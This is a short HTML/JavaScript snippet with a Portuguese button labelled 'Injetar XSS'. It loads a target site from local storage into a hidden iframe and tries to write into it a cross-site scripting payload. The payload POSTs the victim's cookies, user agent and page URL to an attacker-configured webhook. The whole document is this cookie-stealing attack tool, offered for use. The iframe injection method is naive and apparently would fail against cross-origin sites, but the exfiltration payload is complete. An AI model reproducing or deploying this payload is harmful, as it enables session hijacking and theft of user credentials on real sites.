<button id="xssBtn">Injetar XSS</button>

<script>
  document.getElementById("xssBtn").addEventListener("click", () => {
    const site = localStorage.getItem('xssSite');
    const webhook = localStorage.getItem('xssWebhook');

    if (!site || !webhook) return alert("Site ou Webhook não configurado!");

    // Simula iframe apontando pro site alvo
    const iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = site;

    // Exemplo de payload XSS
    const payload = `
      <script>
        fetch('${webhook}', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            cookie: document.cookie,
            userAgent: navigator.userAgent,
            location: window.location.href
          })
        });
      <\/script>
    `;

    // Injeta o script (isso só funcionaria se o site alvo estiver vulnerável e permitir `<iframe>` + `document.write`)
    iframe.onload = () => {
      try {
        const frameDoc = iframe.contentWindow.document;
        frameDoc.open();
        frameDoc.write(payload);
        frameDoc.close();
        alert("Payload injetado.");
      } catch (err) {
        alert("Não foi possível injetar. Provavelmente CORS ou site protegido.");
      }
    };

    document.body.appendChild(iframe);
  });
</script>
